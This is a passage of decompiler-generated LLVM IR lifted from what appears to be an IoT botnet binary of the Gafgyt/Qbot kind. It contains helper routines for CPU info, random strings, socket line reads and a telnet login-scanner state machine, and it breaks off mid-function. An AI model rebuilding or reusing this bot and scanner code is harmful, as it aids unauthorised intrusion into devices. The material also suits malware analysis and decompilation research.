  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9664 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9664, i32* @r2, align 4
  %v3_9674 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1df08.43 to i32), i32 0)
  %v2_982c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_9694 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9824

dec_label_pc_9684:                                ; preds = %dec_label_pc_9824
  %v2_9694 = call i32 @uppercase(i8* %v1_9694)
  %v4_96ac = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1df18.45, i32 0, i32 0))
  %v9_96c4 = icmp eq i32 %v4_96ac, %v2_982c
  br i1 %v9_96c4, label %dec_label_pc_96cc, label %dec_label_pc_9808

dec_label_pc_96cc:                                ; preds = %dec_label_pc_9684
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96e4:                                ; preds = %dec_label_pc_9710, %dec_label_pc_9700, %dec_label_pc_96f0
  %v1_96e8 = add i32 %v4_96f0, 1
  %v5_96ec = inttoptr i32 %v1_96e8 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96cc, %dec_label_pc_96e4
  %storemerge2 = phi i8* [ %v5_96ec, %dec_label_pc_96e4 ], [ %tmp21, %dec_label_pc_96cc ]
  %v4_96f0 = ptrtoint i8* %storemerge2 to i32
  %v2_96f4 = load i8, i8* %storemerge2, align 1
  %v7_96f8 = icmp eq i8 %v2_96f4, 32
  br i1 %v7_96f8, label %dec_label_pc_96e4, label %dec_label_pc_9700

dec_label_pc_9700:                                ; preds = %dec_label_pc_96f0
  %v2_9704 = load i8, i8* %storemerge2, align 1
  %v7_9708 = icmp eq i8 %v2_9704, 9
  br i1 %v7_9708, label %dec_label_pc_96e4, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9700
  %v2_9714 = load i8, i8* %storemerge2, align 1
  %v7_9718 = icmp eq i8 %v2_9714, 58
  br i1 %v7_9718, label %dec_label_pc_96e4, label %dec_label_pc_9748.preheader

dec_label_pc_9748.preheader:                      ; preds = %dec_label_pc_9710
  %v1_974c = add i32 %v4_96f0, -1
  br label %dec_label_pc_9748

dec_label_pc_9724:                                ; preds = %dec_label_pc_9770, %dec_label_pc_9748
  %v3_9734 = call i32 @strlen(i8* %storemerge2)
  %v2_973c = add i32 %v1_974c, %v3_9734
  %v3_9744 = inttoptr i32 %v2_973c to i8*
  store i8 0, i8* %v3_9744, align 1
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %dec_label_pc_9748.preheader, %dec_label_pc_9724
  %v3_9758 = call i32 @strlen(i8* %storemerge2)
  %v2_9760 = add i32 %v1_974c, %v3_9758
  %v1_9764 = inttoptr i32 %v2_9760 to i8*
  %v2_9764 = load i8, i8* %v1_9764, align 1
  %v7_9768 = icmp eq i8 %v2_9764, 13
  br i1 %v7_9768, label %dec_label_pc_9724, label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9748
  store i32 %v1_974c, i32* @r4, align 4
  %v3_9780 = call i32 @strlen(i8* %storemerge2)
  %v0_9788 = load i32, i32* @r4, align 4
  %v2_9788 = add i32 %v0_9788, %v3_9780
  %v1_978c = inttoptr i32 %v2_9788 to i8*
  %v2_978c = load i8, i8* %v1_978c, align 1
  %v7_9790 = icmp eq i8 %v2_978c, 10
  br i1 %v7_9790, label %dec_label_pc_9724, label %dec_label_pc_9798

dec_label_pc_9798:                                ; preds = %dec_label_pc_9770
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97a4 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v2_97ac = icmp eq i32 %v2_97a4, 0
  br i1 %v2_97ac, label %dec_label_pc_97d0, label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_9798
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97c0 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v3_97cc = inttoptr i32 %v2_97c0 to i8*
  store i8 0, i8* %v3_97cc, align 1
  br label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_9798, %dec_label_pc_97b4
  store i32 %v4_96f0, i32* @r1, align 4
  %v2_97ec = inttoptr i32 %arg1 to i8*
  %v3_97ec = call i32 @strcpy(i8* %v2_97ec, i32 %v4_96f0)
  %v1_97f4 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9808:                                ; preds = %dec_label_pc_9684
  store i32 4096, i32* @r2, align 4
  %v3_9820 = call i32 @__GI_memset(i8* %v1_9694, i32 0)
  br label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %entry, %dec_label_pc_9808
  %v4_983c = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v3_9674, i32 %v2_982c)
  %v2_9844 = icmp eq i32 %v4_983c, 0
  br i1 %v2_9844, label %dec_label_pc_984c, label %dec_label_pc_9684

dec_label_pc_984c:                                ; preds = %dec_label_pc_9824
  %v1_9850 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9860:                                ; preds = %dec_label_pc_97d0, %dec_label_pc_984c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_984c ], [ 0, %dec_label_pc_97d0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_974c, { 2, 1, 0 }
  uselistorder i32 %v4_96f0, { 3, 2, 1, 0, 5, 4, 6, 7 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder i32 %v3_9674, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9860, { 1, 0 }
  uselistorder label %dec_label_pc_9824, { 1, 0 }
  uselistorder label %dec_label_pc_97d0, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
  uselistorder label %dec_label_pc_96f0, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_9890 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_98a4 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1df08.43 to i32), i32 0)
  %v1_98c4 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9920

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9920
  %v2_98c4 = call i32 @uppercase(i8* %v1_98c4)
  %v4_98dc = call i32 @strstr(i32 %v2_9890, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1df18.45, i32 0, i32 0))
  %v9_98f0 = icmp eq i32 %v4_98dc, %v2_9890
  br i1 %v9_98f0, label %dec_label_pc_98f8, label %dec_label_pc_9904

dec_label_pc_98f8:                                ; preds = %dec_label_pc_98b4
  %v1_98fc = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9904

dec_label_pc_9904:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_98f8
  %stack_var_-24.0 = phi i32 [ %v1_98fc, %dec_label_pc_98f8 ], [ %stack_var_-24.1, %dec_label_pc_98b4 ]
  store i32 4096, i32* @r2, align 4
  %v3_991c = call i32 @__GI_memset(i8* %v1_98c4, i32 0)
  br label %dec_label_pc_9920

dec_label_pc_9920:                                ; preds = %entry, %dec_label_pc_9904
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9904 ]
  %v4_9938 = call i32 @fdgets(i32 %v2_9890, i32 4096, i32 %v3_98a4, i32 %v2_9890)
  %v2_9940 = icmp eq i32 %v4_9938, 0
  br i1 %v2_9940, label %dec_label_pc_9948, label %dec_label_pc_98b4

dec_label_pc_9948:                                ; preds = %dec_label_pc_9920
  %v1_994c = call i32 @__GI_close(i32 %v3_98a4)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9890, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9920, { 1, 0 }
  uselistorder label %dec_label_pc_9904, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9970 = load i32, i32* @r4, align 4
  %v6_9970 = load i32, i32* @fp, align 4
  %v0_997c = load i32, i32* %r0.global-to-local, align 4
  %v5_9a1024 = icmp sgt i32 %arg2, 0
  br i1 %v5_9a1024, label %dec_label_pc_9998, label %dec_label_pc_9a14

dec_label_pc_9998:                                ; preds = %entry, %dec_label_pc_9998
  %storemerge725 = phi i32 [ %v1_99fc, %dec_label_pc_9998 ], [ 0, %entry ]
  %v2_99a4 = add i32 %storemerge725, %v0_997c
  store i32 %v2_99a4, i32* @r4, align 4
  %v0_99a8 = call i32 @rand_cmwc()
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v3_99b8 = udiv i32 %v0_99a8, 26
  %tmp = mul nsw i32 %v3_99b8, -2
  %v2_99dc = add i32 %v0_99a8, %tmp
  %fold = add i32 %v2_99dc, 65
  %v1_99f4 = trunc i32 %fold to i8
  %v2_99f4 = load i32, i32* @r4, align 4
  %v3_99f4 = inttoptr i32 %v2_99f4 to i8*
  store i8 %v1_99f4, i8* %v3_99f4, align 1
  %v1_99fc = add nuw nsw i32 %storemerge725, 1
  %v5_9a10 = icmp slt i32 %v1_99fc, %arg2
  br i1 %v5_9a10, label %dec_label_pc_9998, label %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge

dec_label_pc_9a04.dec_label_pc_9a14_crit_edge:    ; preds = %dec_label_pc_9998
  %v1_9a1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge, %entry
  %v1_9a1c = phi i32 [ %v1_9a1c.pre, %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge ], [ %v0_997c, %entry ]
  store i32 %v3_9970, i32* @r4, align 4
  store i32 %v6_9970, i32* @fp, align 4
  ret i32 %v1_9a1c

; uselistorder directives
  uselistorder i32 %v1_99fc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9998, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a78.lr.ph:
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a28 = load i32, i32* @fp, align 4
  store i32 %v3_9a28, i32* %stack_var_-16, align 4
  store i32 39472, i32* %stack_var_-4, align 4
  %v2_9a2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a2c, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9a50 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9a64 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a78.lr.ph, %dec_label_pc_9a78
  %storemerge426 = phi i32 [ 0, %dec_label_pc_9a78.lr.ph ], [ %v1_9a8c, %dec_label_pc_9a78 ]
  %v5_9a84 = mul nuw nsw i32 %storemerge426, 4
  %v6_9a84 = add i32 %v5_9a84, %v2_9a64
  %v7_9a84 = inttoptr i32 %v6_9a84 to i32*
  store i32 0, i32* %v7_9a84, align 4
  %v1_9a8c = add nuw nsw i32 %storemerge426, 1
  %tmp51 = icmp ult i32 %v1_9a8c, 32
  br i1 %tmp51, label %dec_label_pc_9a78, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a78
  %v13_9a28 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9aa4 = udiv i32 %arg1, 32
  %v3_9ab0 = mul nuw nsw i32 %v3_9aa4, 4
  %v2_9ab8 = add nsw i32 %v3_9ab0, -160
  %v2_9abc = add i32 %v2_9ab8, %v13_9a28
  %v1_9ac0 = inttoptr i32 %v2_9abc to i32*
  %v2_9ac0 = load i32, i32* %v1_9ac0, align 4
  %v1_9ac8 = urem i32 %arg1, 32
  %v6_9ad0 = shl i32 1, %v1_9ac8
  %v2_9ad4 = or i32 %v2_9ac0, %v6_9ad0
  store i32 %v2_9ad4, i32* %v1_9ac0, align 4
  %v1_9af4 = add i32 %arg1, 1
  %v2_9b00 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9b14 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9b28 = icmp sgt i32 %v5_9b14, 0
  br i1 %v5_9b28, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c28.preheader

dec_label_pc_9c28.preheader:                      ; preds = %dec_label_pc_9aa0
  %v7_9c3022 = icmp slt i32 %tmp32, 10
  br i1 %v7_9c3022, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9b68.lr.ph:                          ; preds = %dec_label_pc_9c28.preheader, %dec_label_pc_9c1c
  %stack_var_-44.023 = phi i32 [ %v1_9c20, %dec_label_pc_9c1c ], [ %tmp32, %dec_label_pc_9c28.preheader ]
  %v2_9b34 = load i32, i32* @global_var_28570.50, align 4
  %v3_9b40 = call i32 @sockprintf(i32 %v2_9b34, i32 ptrtoint ([5 x i8]* @global_var_1df24.52 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9b68.lr.ph, %dec_label_pc_9b68
  %storemerge514 = phi i32 [ 0, %dec_label_pc_9b68.lr.ph ], [ %v1_9b7c, %dec_label_pc_9b68 ]
  %v5_9b74 = mul nuw nsw i32 %storemerge514, 4
  %v6_9b74 = add i32 %v5_9b74, %v2_9a64
  %v7_9b74 = inttoptr i32 %v6_9b74 to i32*
  store i32 0, i32* %v7_9b74, align 4
  %v1_9b7c = add nuw nsw i32 %storemerge514, 1
  %tmp52 = icmp ult i32 %v1_9b7c, 32
  br i1 %tmp52, label %dec_label_pc_9b68, label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %dec_label_pc_9b68
  %v2_9bb0 = load i32, i32* %v1_9ac0, align 4
  %v2_9bc4 = or i32 %v2_9bb0, %v6_9ad0
  store i32 %v2_9bc4, i32* %v1_9ac0, align 4
  store i32 0, i32* @r2, align 4
  %v5_9c04 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9c18 = icmp sgt i32 %v5_9c04, 0
  br i1 %v5_9c18, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9b90
  %v1_9c20 = add nsw i32 %stack_var_-44.023, 1
  %v7_9c30 = icmp slt i32 %v1_9c20, 10
  br i1 %v7_9c30, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9cbc.preheader:                      ; preds = %dec_label_pc_9c1c, %dec_label_pc_9b90, %dec_label_pc_9c28.preheader, %dec_label_pc_9aa0
  %v2_9c50 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9cc456 = icmp sgt i32 %arg3, 1
  %v2_9cdc58 = icmp eq i1 %not.v7_9cc456, false
  br i1 %v2_9cdc58, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9cbc.preheader, %dec_label_pc_9cb0
  %v1_9cc061.in = phi i32 [ %v1_9cc061, %dec_label_pc_9cb0 ], [ %arg3, %dec_label_pc_9cbc.preheader ]
  %stack_var_-40.060 = phi i8* [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %arg2, %dec_label_pc_9cbc.preheader ]
  %stack_var_-36.059 = phi i32 [ %v1_9cb4, %dec_label_pc_9cb0 ], [ 0, %dec_label_pc_9cbc.preheader ]
  %v1_9cc061 = add i32 %v1_9cc061.in, -1
  %v2_9c4c = load i32, i32* @global_var_28570.50, align 4
  %v5_9c64 = call i32 @__libc_recv(i32 %v2_9c4c, i32 %v2_9c50, i32 1, i32 0, i32 %v1_9cc061)
  %v7_9c6c = icmp eq i32 %v5_9c64, 1
  br i1 %v7_9c6c, label %dec_label_pc_9c8c, label %dec_label_pc_9c74

dec_label_pc_9c74:                                ; preds = %dec_label_pc_9c48
  store i8 0, i8* %stack_var_-40.060, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9c8c:                                ; preds = %dec_label_pc_9c48
  %v3_9c8c = load i8, i8* %stack_var_-185, align 1
  %v4_9c90 = ptrtoint i8* %stack_var_-40.060 to i32
  store i8 %v3_9c8c, i8* %stack_var_-40.060, align 1
  %v1_9c9c = add i32 %v4_9c90, 1
  %v5_9ca0 = inttoptr i32 %v1_9c9c to i8*
  %v3_9ca4 = load i8, i8* %stack_var_-185, align 1
  %v7_9ca8 = icmp eq i8 %v3_9ca4, 10
  br i1 %v7_9ca8, label %dec_label_pc_9ce4, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9c8c
  %v1_9cb4 = add i32 %stack_var_-36.059, 1
  %not.v7_9cc4 = icmp sgt i32 %v1_9cc061, 1
  %v2_9cdc = icmp eq i1 %not.v7_9cc4, false
  br i1 %v2_9cdc, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9c8c, %dec_label_pc_9cb0, %dec_label_pc_9cbc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9cbc.preheader ], [ %v1_9cb4, %dec_label_pc_9cb0 ], [ %stack_var_-36.059, %dec_label_pc_9c8c ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9cbc.preheader ], [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %v5_9ca0, %dec_label_pc_9c8c ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9c74, %dec_label_pc_9ce4
  %storemerge = phi i32 [ -1, %dec_label_pc_9c74 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9ce4 ]
  %v2_9d04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9d04, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9cc061, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.060, { 1, 2, 0 }
  uselistorder i32 %v1_9c20, { 1, 0 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %storemerge426, { 1, 0 }
  uselistorder i32 %v2_9a64, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cf8, { 1, 0 }
  uselistorder label %dec_label_pc_9ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9c48, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 1, 0 }
  uselistorder label %dec_label_pc_9b68.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9d14 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9d14, i32* @ip, align 4
  %v3_9d18 = load i32, i32* @fp, align 4
  store i32 40224, i32* %stack_var_-4, align 4
  %v2_9d1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d1c, i32* @fp, align 4
  %v1_9d2c = add i32 %arg1, 4
  %v2_9d2c = inttoptr i32 %v1_9d2c to i32*
  %v3_9d2c = load i32, i32* %v2_9d2c, align 4
  store i32 %v3_9d2c, i32* @r0, align 4
  %v1_9d38 = call i32 @__GI_inet_ntoa(i32 %v3_9d2c)
  store i32 %v3_9d18, i32* @fp, align 4
  ret i32 %v1_9d38

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9d54 = load i32, i32* @fp, align 4
  store i32 40284, i32* %stack_var_-4, align 4
  %v2_9d58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d58, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9d80 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9d94 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9da4 = load i8, i8* %arg3, align 1
  %v2_9da8 = icmp eq i8 %v2_9da4, -1
  br i1 %v2_9da8, label %dec_label_pc_9db0, label %dec_label_pc_9dc0

dec_label_pc_9db0:                                ; preds = %entry
  %v3_9da4 = zext i8 %v2_9da4 to i32
  %v6_9dbc = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9da4, i32 %v5_9d94)
  br label %dec_label_pc_9dc0

dec_label_pc_9dc0:                                ; preds = %entry, %dec_label_pc_9db0
  %v3_9dc4 = load i32, i32* %stack_var_0, align 4
  %v3_9dc8 = call i32 @contains_string(i32 %tmp, i32 %v3_9dc4)
  %v2_9dd0 = icmp ne i32 %v3_9dc8, 0
  %. = zext i1 %v2_9dd0 to i32
  store i32 %v3_9d54, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9da4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9dc0, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9e44.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e04 = load i32, i32* @fp, align 4
  store i32 %v3_9e04, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9e30 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9e44

dec_label_pc_9e44:                                ; preds = %dec_label_pc_9e44.lr.ph, %dec_label_pc_9e44
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9e44.lr.ph ], [ %v1_9e58, %dec_label_pc_9e44 ]
  %v5_9e50 = mul nuw nsw i32 %storemerge25, 4
  %v6_9e50 = add i32 %v5_9e50, %v2_9e30
  %v7_9e50 = inttoptr i32 %v6_9e50 to i32*
  store i32 0, i32* %v7_9e50, align 4
  %v1_9e58 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9e58, 32
  br i1 %tmp21, label %dec_label_pc_9e44, label %dec_label_pc_9e6c

dec_label_pc_9e6c:                                ; preds = %dec_label_pc_9e44
  %v13_9e04 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9e70 = udiv i32 %arg1, 32
  %v3_9e7c = mul nuw nsw i32 %v3_9e70, 4
  %v2_9e84 = add nsw i32 %v3_9e7c, -136
  %v2_9e88 = add i32 %v2_9e84, %v13_9e04
  %v1_9e8c = inttoptr i32 %v2_9e88 to i32*
  %v2_9e8c = load i32, i32* %v1_9e8c, align 4
  %v1_9e94 = urem i32 %arg1, 32
  %v6_9e9c = shl i32 1, %v1_9e94
  %v2_9ea0 = or i32 %v2_9e8c, %v6_9e9c
  store i32 %v2_9ea0, i32* %v1_9e8c, align 4
  %v1_9ec0 = add i32 %arg1, 1
  %v2_9ec8 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9edc = call i32 @__libc_select(i32 %v1_9ec0, i32 %v2_9e30, i32 0, i32 0, i32 %v2_9ec8)
  %v5_9ee8 = icmp sgt i32 %v5_9edc, 0
  br i1 %v5_9ee8, label %dec_label_pc_9ef8, label %dec_label_pc_9eec

dec_label_pc_9eec:                                ; preds = %dec_label_pc_9e6c
  br label %dec_label_pc_9f18

dec_label_pc_9ef8:                                ; preds = %dec_label_pc_9e6c
  %v5_9f0c = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9eec, %dec_label_pc_9ef8
  %storemerge = phi i32 [ %v5_9f0c, %dec_label_pc_9ef8 ], [ 0, %dec_label_pc_9eec ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9e30, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9f18, { 1, 0 }
  uselistorder label %dec_label_pc_9e44, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9f48 = icmp eq i32 %arg2, 0
  br i1 %v2_9f48, label %dec_label_pc_9f50, label %dec_label_pc_9f60

dec_label_pc_9f50:                                ; preds = %entry
  %v2_9f54 = load i32, i32* %arg1, align 4
  %v1_9f5c = call i32 @__GI_close(i32 %v2_9f54)
  br label %dec_label_pc_9f60

dec_label_pc_9f60:                                ; preds = %entry, %dec_label_pc_9f50
  %v2_9f68 = add i32 %tmp, 16
  %v3_9f68 = inttoptr i32 %v2_9f68 to i32*
  store i32 0, i32* %v3_9f68, align 4
  %v3_9f6c = load i32, i32* %stack_var_-24, align 4
  %v1_9f78 = trunc i32 %v3_9f6c to i8
  %v3_9f78 = add i32 %tmp, 8
  %v4_9f78 = inttoptr i32 %v3_9f78 to i8*
  store i8 %v1_9f78, i8* %v4_9f78, align 1
  %v1_9f80 = add i32 %tmp, 24
  %v2_9f80 = inttoptr i32 %v1_9f80 to i32*
  %v3_9f80 = load i32, i32* %v2_9f80, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9f90 = inttoptr i32 %v3_9f80 to i8*
  %v3_9f90 = call i32 @__GI_memset(i8* %v2_9f90, i32 0)
  ret i32 %v3_9f90

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9f60, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9fa4 = load i32, i32* @fp, align 4
  %v2_9fbc = inttoptr i32 %arg1 to i32*
  %v3_9fbc = call i32 @advance_state(i32* %v2_9fbc, i32 0)
  %v3_9fc8 = add i32 %arg1, 9
  %v4_9fc8 = inttoptr i32 %v3_9fc8 to i8*
  store i8 1, i8* %v4_9fc8, align 1
  store i32 %v3_9fa4, i32* @fp, align 4
  ret i32 %v3_9fbc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9fdc = load i32, i32* @fp, align 4
  %v3_9ff4 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_28270.57 to i32))
  store i32 %v3_9fdc, i32* @fp, align 4
  ret i32 %v3_9ff4
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_a014 = load i32, i32* @fp, align 4
